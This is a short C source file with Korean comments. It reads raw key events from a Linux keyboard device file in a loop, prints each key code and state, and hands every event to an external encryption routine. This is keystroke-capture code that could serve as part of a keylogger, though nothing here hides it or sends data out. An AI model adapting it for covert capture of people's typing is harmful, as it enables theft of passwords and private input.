#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <errno.h>
#include "input_monitor.h"
#include "encryptor.h"

#define KEYBOARD_DEVICE "/dev/input/event3"  // 시스템에 따라 경로 확인 필요

int start_input_monitor() {
    int fd = open(KEYBOARD_DEVICE, O_RDONLY);
    if (fd < 0) {
        perror("키보드 장치 열기 실패");
        return -1;
    }

    struct input_event ev;
    printf("키 입력 감시 시작 (Ctrl+C로 종료)\n");

    while (1) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n == (ssize_t)sizeof(ev)) {
            if (ev.type == EV_KEY) {
                printf("키코드: %u, 상태: %u\n", ev.code, ev.value);
                encrypt_event(&ev);
            }
        } else {
            perror("읽기 실패");
            break;
        }
    }

    close(fd);
    return 0;
}
